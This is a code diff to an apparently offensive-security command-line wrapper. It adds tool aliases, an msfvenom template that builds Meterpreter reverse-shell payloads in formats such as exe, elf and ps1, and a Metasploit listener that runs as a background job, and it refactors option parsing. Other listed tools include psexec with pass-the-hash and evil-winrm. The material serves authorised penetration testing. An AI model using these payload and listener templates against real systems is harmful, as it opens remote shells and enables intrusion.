@@ -28,6 +28,7 @@ class InfraModule(BaseModule):
             "category": "SMB Tools",
             "requires": ["target"],
             "auth_mode": "flag_U",
+            "aliases": ["smb-c"],
         },
         "smbmap": {
             "cmd": "smbmap -H {target} {auth} --no-banner -q",
@@ -35,7 +36,8 @@ class InfraModule(BaseModule):
             "desc": "Enumerate SMB shares and permissions",
             "category": "SMB Tools",
             "requires": ["target"],
-            "auth_mode": "u_p_flags"
+            "auth_mode": "u_p_flags",
+            "aliases": ["smb-map"],
         },
         "enum4linux": {
             "cmd": "enum4linux-ng -A {auth} {target}",
@@ -70,11 +72,20 @@ class InfraModule(BaseModule):
             "auth_mode": "custom_ftp"
         },
         "msf": {
-            "cmd": "msfconsole -q -x \"use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run\"",
+            "cmd": "msfconsole -q -x \"use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"",
             "binary": "msfconsole",
             "desc": "Metasploit reverse shell handler",
             "category": "Exploitation",
-            "requires": ["lport", "interface"]
+            "requires": ["lport"],
+            "aliases": ["handler", "listener", "msfconsole"],
+        },
+        "msfvenom": {
+            "cmd": "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {payload_format} -o {payload_file}",
+            "binary": "msfvenom",
+            "desc": "Generate a Metasploit payload that matches the listener",
+            "category": "Exploitation",
+            "requires": ["lport"],
+            "aliases": ["venom"],
         },
         "rdp": {
             "cmd": "xfreerdp3 /v:{target} +clipboard /dynamic-resolution /drive:share,. {auth}",
@@ -98,7 +109,8 @@ class InfraModule(BaseModule):
             "desc": "WinRM shell access",
             "category": "Remote Execution",
             "requires": ["target"],
-            "auth_mode": "u_p_flags"
+            "auth_mode": "u_p_flags",
+            "aliases": ["evil-winrm"],
         },
         "psexec": {
             "cmd": "impacket-psexec {creds}@{target}",
@@ -136,6 +148,64 @@ class InfraModule(BaseModule):
     def __init__(self, session):
         super().__init__(session)
 
+    def _resolve_lhost(self):
+        lhost = self.session.get("lhost")
+        if lhost:
+            return lhost
+        interface = self.session.get("interface")
+        return get_ip_address(interface) or "0.0.0.0"
+
+    def _resolve_payload(self):
+        return (
+            self.session.get("payload")
+            or self.session.get_config_flags("infra", "msf", "payload")
+            or "windows/meterpreter/reverse_tcp"
+        )
+
+    def _resolve_payload_format(self, payload):
+        configured_format = (
+            self.session.get("payload_format")
+            or self.session.get_config_flags("infra", "msfvenom", "format")
+        )
+        if configured_format:
+            return configured_format
+
+        payload_lower = payload.lower()
+        if "windows" in payload_lower:
+            return "exe"
+        if "linux" in payload_lower:
+            return "elf"
+        if "osx" in payload_lower or "macho" in payload_lower:
+            return "macho"
+        if "powershell" in payload_lower or "psh" in payload_lower:
+            return "ps1"
+        if "war" in payload_lower:
+            return "war"
+        if "python" in payload_lower:
+            return "py"
+        return "raw"
+
+    def _resolve_payload_file(self, payload, payload_format):
+        payload_file = self.session.get("payload_file")
+        if payload_file:
+            return payload_file
+
+        ext_map = {
+            "exe": "exe",
+            "elf": "elf",
+            "macho": "macho",
+            "raw": "bin",
+            "ps1": "ps1",
+            "war": "war",
+            "py": "py",
+            "aspx": "aspx",
+            "asp": "asp",
+            "jsp": "jsp",
+        }
+        payload_name = payload.split("/")[-1].replace("_", "-")
+        extension = ext_map.get(payload_format, payload_format)
+        return f"{payload_name}.{extension}"
+
     def run_tool(self, tool_name, copy_only=False, edit=False, preview=False, no_auth=False):
         tool = self.TOOLS.get(tool_name)
         if not tool:
@@ -153,7 +223,7 @@ class InfraModule(BaseModule):
         # Determine target to use - prioritize domain if available, else target IP
         target = domain_resolved if domain_resolved else self.session.get("target")
 
-        if not target:
+        if tool_name not in ("msf", "msfvenom") and not target:
              log_warn("Target is not set. Use 'set TARGET <ip/domain>'")
              return
 
@@ -163,6 +233,10 @@ class InfraModule(BaseModule):
         hash_val = self.session.get("hash")
         interface = self.session.get("interface")
         lport = self.session.get("lport")
+        lhost = self._resolve_lhost()
+        payload_name = self._resolve_payload()
+        payload_format = self._resolve_payload_format(payload_name)
+        payload_file = self._resolve_payload_file(payload_name, payload_format)
 
         # 2. Auto-enable auth if credentials are present (unless -noauth was passed)
         has_creds = bool(user and (password or hash_val))
@@ -180,6 +254,10 @@ class InfraModule(BaseModule):
             if not (user and (password or hash_val)):
                  log_warn("Credentials required for this tool. Use 'set user <username:password>'")
                  return
+
+        if tool_name in ("msf", "msfvenom") and not lhost:
+            log_warn("LHOST could not be resolved. Use 'set lhost <ip>' or set a valid interface.")
+            return
 
         # 3. Build Auth String
         auth_str = ""
@@ -240,9 +318,11 @@ class InfraModule(BaseModule):
                  "password": shlex.quote(password or ""),
                  "creds": creds_str,
                  "lport": shlex.quote(lport or "4444"),
-                 "lhost": shlex.quote(get_ip_address(interface) or "0.0.0.0"),
-                 "payload": "",  # Set by msf config block below if needed
-                 "config_flags": config_flags
+                 "lhost": shlex.quote(lhost),
+                 "payload": shlex.quote(payload_name),
+                 "payload_format": shlex.quote(payload_format),
+                 "payload_file": shlex.quote(payload_file),
+                 "config_flags": config_flags,
              }
              
              # Special case for FTP default anonymous
@@ -253,11 +333,6 @@ class InfraModule(BaseModule):
                  else:
                      format_args["user"] = shlex.quote(user or "anonymous")
                      format_args["password"] = shlex.quote(password or "anonymous")
-             
-             # Special case for MSF: read payload from config
-             if tool_name == "msf":
-                 payload_from_config = self.session.get_config_flags("infra", "msf", "payload")
-                 format_args["payload"] = payload_from_config or "windows/meterpreter/reverse_tcp"
              
              cmd = tool["cmd"].format(**format_args)
              
@@ -270,7 +345,14 @@ class InfraModule(BaseModule):
             log_error(f"Missing variable in command template: {e}")
 
     def run(self, args_list):
-        if "-h" in args_list or "help" in args_list:
+        args_list, cli_flags = self.parse_cli_options(args_list)
+        tool_index, tool_name = self.find_tool_invocation(args_list)
+
+        if tool_name and self.has_help_flag(args_list[tool_index + 1:]):
+            self.print_tool_help("infra", tool_name)
+            return
+
+        if self.has_help_flag(args_list):
             self._print_help(
                 "Infrastructure Module",
                 "red -i -<tool> [options]",
@@ -279,27 +361,21 @@ class InfraModule(BaseModule):
                     "red -T 10.10.10.10 -i -nmap",
                     "red -T 10.10.10.10 -U admin:pass -i -smbclient",
                     "red -T 10.10.10.10 -U admin -H <ntlm_hash> -i -psexec",
+                    "red -i -P 4444 -msfvenom -p",
+                    "red -i -P 4444 -msf",
                 ]
             )
             return
-        
-        # Auto-detect credits in CLI mode
-        user = self.session.get("username")
-        password = self.session.get("password")
-        has_creds = bool(user or password) # Or hash, but mainly user/pass for defaults
-        
-        # Map flags to tool names
-        # We need to strip '-' prefix
-        for arg in args_list:
-            if arg.startswith("-"):
-                tool_name = arg.lstrip("-")
-                # Check if this flag corresponds to a tool
-                if tool_name in self.TOOLS:
-                     # It's a tool! Run it.
-                      # In CLI, auth is always on by default if creds are set.
-                      # -noauth is not supported in CLI mode (interactive only).
-                     self.run_tool(tool_name, no_auth=False)
-                     return
+
+        if tool_name:
+            self.run_tool(
+                tool_name,
+                copy_only=cli_flags["copy_only"],
+                edit=cli_flags["edit"],
+                preview=cli_flags["preview"],
+                no_auth=cli_flags["no_auth"],
+            )
+            return
 
         log_warn("No valid tool flag found. Use interactive mode or specify -<toolname>")
 
